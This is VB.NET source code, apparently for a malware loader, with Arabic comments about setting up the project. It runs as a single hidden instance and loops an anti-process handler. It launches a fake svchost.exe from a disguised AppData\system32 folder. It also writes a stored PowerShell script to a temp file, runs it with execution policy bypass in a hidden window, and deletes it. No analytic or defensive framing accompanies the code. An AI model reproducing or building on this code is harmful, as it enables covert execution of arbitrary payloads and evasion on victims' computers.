Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment
Imports System.Collections

Module Module1
    Sub Main()
        'بعد بحث 
        'الحمد لله عرفنا المشكلة منين 
        ' المشكلة كانت في انشاء مشروع فارغ 
        ' والحل انشاء مشروع ويندوز فورمز وبعد كده تتمسح، وده لان عند انشاء المشروع يتم اضافة مكتبات 
        'لمنع تشغيل الملف التنفيذي اكثر من مرة 
        Dim mut As System.Threading.Mutex = New System.Threading.Mutex(False, Application.ProductName)
        Dim running As Boolean = Not mut.WaitOne(0, False)
        If running Then
            Application.ExitThread()
            Return
        End If
        'ByRun()
        MyAntiProcess.Handler()
        PS()
        Do While (1)
            ' MyAntiProcess.Start()
            Threading.Thread.Sleep(1000)
            MyAntiProcess.Handler()
        Loop
    End Sub
    Sub ByRun()
        Threading.Thread.Sleep(2000)
        Dim oProcess As New Process()
        Dim oStartInfo As New ProcessStartInfo("cmd", "/c wmic process where ExecutablePath='%HomeDrive%\\Users\\%username%\\AppData\\Roaming\\system32\\svchost.exe' Get ProcessID")
        oStartInfo.WindowStyle = ProcessWindowStyle.Hidden
        oStartInfo.UseShellExecute = False
        oStartInfo.RedirectStandardOutput = True
        oStartInfo.CreateNoWindow = True
        oProcess.StartInfo = oStartInfo
        oProcess.Start()
        Dim sOutput As String
        sOutput = oProcess.StandardOutput.ReadToEnd().Replace("ProcessId", "")
        Dim pid As Integer
        pid = Val(sOutput)
        'MsgBox(pid)
        If pid = 0 Then
            RunX()
            ' MsgBox("Doh! Process with PID = " & pid & " does not exist.")
        Else
            Dim p As Process = Nothing
            Try
                p = Process.GetProcessById(pid)
            Catch ex As ArgumentException
                ' process not found
            End Try
            If p IsNot Nothing Then
                ' Process exists
                '      MsgBox("Yey! Process " & p.ProcessName & " exists!")
            Else
                ' Process doesn't exist
                '      MsgBox("Doh! Process with PID = " & pid & " does not exist.")
                RunX()
            End If
        End If
    End Sub
    Public Sub RunX()
        Dim AppDataS As String = GetFolderPath(SpecialFolder.ApplicationData) & "\system32\"
        Dim FDire As String = AppDataS & "svchost.exe"
        Try
            Dim P As New Process
            P.StartInfo.FileName = FDire
            P.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            P.Start()
        Catch ex As Exception
            'MsgBox("ByRun")
        End Try
    End Sub

    Sub PS()
        Threading.Thread.Sleep(2000)
        '  DelTMP()
        ' DelTMP()
        Dim value As String = My.Settings.Hoster
        Dim Cex0 As String = Path.GetTempFileName() & ".ps1"
        Dim tmp As String = Path.GetTempPath()
        IO.File.WriteAllText(Cex0, value)
        Try
            Dim cmd As String = "PowerShell"
            Dim batc As String = " -executionpolicy bypass -NonInteractive -windowstyle Hidden -file " & """" & Cex0 & """"
            Dim P As New Process

            P.StartInfo.FileName = cmd
            P.StartInfo.Arguments = batc
            P.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            ' P.StartInfo.UseShellExecute = True
            ' P.Start()
            P.Start()
            Threading.Thread.Sleep(2500)
            'DelTMP()
            'P.StartTime.IsDaylightSavingTime()
            IO.File.Delete(Cex0)
            '' Important to load powershell by exe app" 
            ' P.WaitForExit()

            '' end Important" 
            '   IO.File.Delete(Cex0)
        Catch ex As Exception
            'MsgBox("dd")
        End Try
    End Sub
End Module
